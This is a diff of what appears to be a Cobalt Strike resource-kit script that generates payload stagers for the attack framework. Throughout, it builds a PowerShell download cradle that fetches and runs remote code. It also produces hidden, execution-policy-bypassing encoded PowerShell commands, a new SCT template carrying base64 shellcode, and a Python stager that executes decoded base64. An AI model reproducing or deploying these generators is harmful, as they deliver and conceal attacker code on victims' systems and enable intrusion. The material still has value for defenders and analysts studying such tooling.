@@ -6,7 +6,7 @@
 set RESOURCE_GENERATOR {
 	local('$handle $data');
 
-	if (-exists script_resource($1)) {
+	if (!-exists script_resource($1)) {
 		return $null;
 	}
 
@@ -25,6 +25,10 @@ set RESOURCE_GENERATOR {
 	}
 	else if ($1 eq "template.x64.ps1") {
 		return strrep($data, '%%DATA%%', base64_encode($3));
+	}
+	else if ($1 eq "template.x64.sct") {
+		
+		return strrep($data, '$$CODE64$$', base64_encode($3));
 	}
 
 	return $null;	
@@ -72,19 +76,20 @@ set RESOURCE_GENERATOR_VBS {
 
 
 set POWERSHELL_DOWNLOAD_CRADLE {
-	return "IEX (New-Object Net.Webclient).DownloadString('" . $1 . "')";
+
+	return "IEX (New-Object Net.Webclient).DownloadString(\"" . $1 . "\")";
 }
 
 
 set POWERSHELL_COMMAND {
 	local('$script');
 
-	$script = base64_encode(str_encode($1, "UTF-16LE"));
+	$script = transform($1, "powershell-base64");
     if ($2) {
-        return "powershell -nop -w hidden -enCodedcommand " . $script;
+        return "powershell -nop -w hidden -enCodedcommand $script";
     }
 
-    return "powershell -nop -exec bypass -EnCodedCommand " . $script;
+    return "powershell -nop -exec bypass -EnCodedCommand $script";
 }
 
 
@@ -100,5 +105,5 @@ set POWERSHELL_COMPRESS {
 
 
 set PYTHON_COMPRESS {
-	return "import base64; exec base64.b64decode(\"" . base64_encode($1) . "\")";
+	return "import base64; exec base64.b64decode(\"".base64_encode($1)."\")";
 }
